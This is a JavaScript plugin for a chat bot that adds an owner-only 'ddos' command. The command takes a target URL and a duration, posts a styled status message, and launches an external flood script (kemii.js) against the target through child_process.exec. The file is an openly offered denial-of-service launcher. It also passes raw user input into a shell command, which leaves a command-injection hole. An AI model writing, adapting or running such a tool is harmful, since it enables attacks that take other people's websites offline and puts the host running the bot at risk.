let fetch = require('node-fetch');
let cp = require('child_process');
let { promisify } = require('util');

let exec = promisify(cp.exec);

exports.run = {
   usage: ['ddos'],
   use: 'link',
   category: 'feature',
   async: async (m, {
      client,
      setting,
      args,
      command,
      isPrefix,
      Func
   }) => {
   if (!args[0] || !args[1]) return client.reply(m.chat, Func.example(isPrefix, command, 'https://hanzz.my.id 1000'), m);
   let date = new Date();
   let hour = date.getHours();
   let minute = date.getMinutes();
   let second = date.getSeconds();
   let targetUrl = args[0];
   let duration = parseInt(args[1]);
   client.sendReact(m.chat, '🕒', m.key)
   let teks = `乂  *K3M11 - DDoS*\n\n`
   teks += `	◦  *Target* : ${targetUrl}\n`
   teks += `	◦  *Duration* : ${duration}\n`
   teks += `	◦  *Methods* : hyper\n`
   teks += `	◦  *Time* : ${hour}:${minute}:${second}\n\n`
   teks += global.footer
   client.sendMessageModify(m.chat, teks, m, {
   ads: false,
   largeThumb: true,
   thumbnail: setting.cover,
   url: `https://check-host.net/check-http?host=${targetUrl}`
   })
   exec(`node kemii.js ${targetUrl} ${duration}`)
   },
   error: false,
   owner: true,
   cache: true,
   location: __filename
}